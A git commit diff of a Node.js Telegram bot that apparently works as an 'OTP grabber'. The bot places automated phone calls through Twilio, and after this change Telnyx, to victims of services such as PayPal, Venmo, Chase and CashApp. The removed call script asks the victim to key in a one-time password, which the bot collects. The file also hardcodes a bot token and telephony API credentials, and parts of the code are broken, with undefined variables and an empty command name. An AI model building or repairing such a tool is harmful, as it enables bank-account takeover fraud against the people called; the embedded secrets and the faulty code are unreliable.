0925785242f20c4e06bba4076a39ba64c54b6360
Otonye Hillary Edwin <102995199+OtiEdwin@users.noreply.github.com>
2023-11-23 11:12:26 +0000

    resolve issue of undefined params

--- bot.js
+++ bot.js
@@ -1,35 +1,27 @@
 const { Telegraf } = require('telegraf'); // importing telegraf.js
 const bot_token = '6328468760:AAFlRNuKnTwAMynlXcsAH118kYhBhahUNQU'
 var bot = new Telegraf(bot_token)
-const accountSid = 'ACc1e28d24ec07899a6bb94af38ab9a31c';
-const authToken = 'b90ab5caf73ed1da0355d8d0dd7e319c';
-const twilio_cell_number = '+14179322556'
-const client = require('twilio')(accountSid, authToken);
 
 // TELNYX STUFF 
 const MY_API_KEY = 'ASGHJ2J623RV34I3C63VTEY8C'
-const telnyx = require('telnyx')('YOUR_API_KEY');
+const telnyx = require('telnyx')('MY_API_KEY');
+const WEBHOOK_URL = 'https://automated-call-service.pages.dev/';
 
 const express = require('express');
-const { Hangup } = require('twilio/lib/twiml/VoiceResponse');
-const { ServiceInstance } = require('twilio/lib/rest/chat/v1/service');
 const app = express();
 const port = process.env.PORT || 3000;
 
-function call (customer_number, ctx){
+async function call (service_number, customer_number, ctx){
    console.log(ctx)
    bot.telegram.sendMessage(ctx.chat.id, `call ongoing...\n Calling ${customer_number} \n please wait...`, {})
 
-   client.calls
-         .create({
-            twiml: '<Response><Gather input="dtmf" timeout="20" action = "/collect_otp"><Say>Please type in the One time Password which we sent to you</Say></Gather></Response>',
-            to: `${number}`,
-            from: twilio_cell_number
-         })
-         .then((call) => {
-            console.log(call.sid)
-            bot.telegram.sendMessage(ctx.chat.id, `call ended, otp is loading...`, {})
-         });
+   // Use the Telnyx API to create a new call
+   await telnyx.calls.create({
+      connection_id: ENV_TELNYX_CONNECTION_ID,
+      to: customer_number,
+      from: ENV_TELNYX_PHONE_NUMBER,
+      webhook_url: WEBHOOK_URL
+   });
 
 }
 
@@ -71,7 +63,7 @@ bot.help(ctx => ctx.reply(`
 ➤ /paypal - Capture bank OTP\n
 `))
 
-bot.command('call', ctx => {
+bot.command('', ctx => {
    console.log(ctx)
    const number = ctx.message.text.split(' ');
    const service = [ 'paypal', 'venmo', 'boa', 'chase', 'bank', 'cashapp' ]
